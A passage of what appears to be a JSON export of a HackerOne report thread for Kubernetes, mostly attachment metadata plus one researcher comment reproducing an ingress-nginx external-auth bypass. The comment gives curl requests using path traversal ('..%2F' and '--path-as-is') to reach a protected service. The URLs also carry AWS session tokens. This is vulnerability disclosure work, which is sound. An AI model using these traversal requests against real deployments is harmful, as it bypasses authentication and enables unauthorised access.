IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ebefd51907b660a6ef21bdcbb340f0929df333e09c835fbfe2e7e29da61c0f1b"
+                },
+                {
+                    "id": 1502937,
+                    "filename": "app.yaml",
+                    "type": "text/x-yaml",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4fqyswvmnjcikgudihjbk63g9ge2?response-content-disposition=attachment%3B%20filename%3D%22app.yaml%22%3B%20filename%2A%3DUTF-8%27%27app.yaml&response-content-type=text%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2788c01f2cc20b4446994263f21894aafc075e91bcba6892b0bcc29f9c819b91"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14259889,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @tuxedo, @turtle_shell ,\n\nI have found one more way to reproduce it on minikube. Instead of using addon for ingress, just deploy it using helm. Steps are as follow:\n\n1. Update minikube to latest version. I'm using v1.24.0. (it works on older version also, but it's better to use latest)\n2. [Optional] Delete all old clusters: `minikube delete --all=true --purge=true`\n3. `minikube start` - I'm using kubernetes in version v1.22.3\n4. Deploy ingress-nginx using helm\n\n```\nhelm upgrade --install ingress-nginx ingress-nginx \\\n  --repo https://kubernetes.github.io/ingress-nginx \\\n  --namespace ingress-nginx --create-namespace\n```\nHere is my version:\n{F1510001}\n\n5. Check if pod and service are up: `kubectl get all -n ingress-nginx`\n\n{F1510002}\n\nEverything looks good\n\n6. apply kubernetes configuration: `kubectl apply -f app.yaml`\n\n7. wait a bit until pods are up\n{F1510003}\n\n8. In second terminal run port forward to ingress service: `kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80`\n{F1510005}\n\n9. Test basic functionality\n\n```curl http://127.0.0.1:8080/public-service/public -H \"Host: app.test\"```\n{F1510008}\n\n```curl http://127.0.0.1:8080/protected-service/protected  -H \"Host: app.test\"```\n{F1510010}\n\n```curl http://127.0.0.1:8080/protected-service/protected -H \"X-Api-Key: secret-api-key\" -H \"Host: app.test\"```\n{F1510012}\n\nThose responses looks good. For /public-service you don't need X-Api-Key, but for /protected-service you need.\n\n10. Exploitation\n\n```curl -v http://127.0.0.1:8080/public-service/..%2Fprotected-service/protected  -H \"Host: app.test\"```\n{F1510013}\n\n```curl --path-as-is -v http://127.0.0.1:8080/public-service/../protected-service/protected  -H \"Host: app.test\"```\n{F1510014}\n\nExploitation successful, external auth was bypassed.\n\n11. Logs of auth-service\n\n{F1510018}\n\nHeaders are containing path traversal\n\nThat's all. Root cause and everything else stays the same.\n\nIn case of questions, just let me know.",
+            "automated_response": false,
+            "created_at": "2021-11-10T19:26:31.550Z",
+            "updated_at": "2021-11-10T19:27:29.899Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1510018,
+                    "filename": "2021-11-10_20_22_58-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y1xcbada9i8hwp2zuvljyssvvscn?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_22_58-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_22_58-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=553aa763b110633c80606a20bf3332ba5c37ea2abaecc9f7e22e40b9460b9bc1"
+                },
+                {
+                    "id": 1510014,
+                    "filename": "2021-11-10_20_21_43-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/smzblpb5anfhgssndod33cu14mgu?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_21_43-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_21_43-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4faac4547e6485cc277a0ff2343a2f4cd1a593429a965b6252dbfa838d4b5d13"
+                },
+                {
+                    "id": 1510013,
+                    "filename": "2021-11-10_20_21_10-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z8mq0omdqan1sp9may8hclnu5ewu?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_21_10-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_21_10-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9b78dccc26ce2594b8ad7c578dcce235a52821dc93d560e5bb0d32e4599e8fc9"
+                },
+                {
+                    "id": 1510012,
+                    "filename": "2021-11-10_20_19_27-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h97ov8p71ctx6mkfkqzxxup4s735?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_19_27-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_19_27-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db6716ea865d3233803a950f52e0e4c1d518ec4fb889593cbe937286f993dfe4"
+                },
+                {
+                    "id": 1510010,
+                    "filename": "2021-11-10_20_18_41-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kux7dzf861d84unm25dzh2qjivmw?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_18_41-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_18_41-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6eabdba939cdca202db7a122ab9b75971637474d7dcb663ab5667ad78be3a2db"
+                },
+                {
+                    "id": 1510008,
+                    "filename": "2021-11-10_20_18_12-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/06kipb28cpc9wmz1pt8n9hrky084?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_18_12-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_18_12-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6636a3f09a9bb8def6bce3dbe04b7d086f5d3fbca9d2d96101f6f4ad7c1129bf"
+                },
+                {
+                    "id": 1510005,
+                    "filename": "2021-11-10_20_14_35-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9g5ht1dpw57sbp7o2lodfo6h2uwb?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_14_35-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_14_35-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3L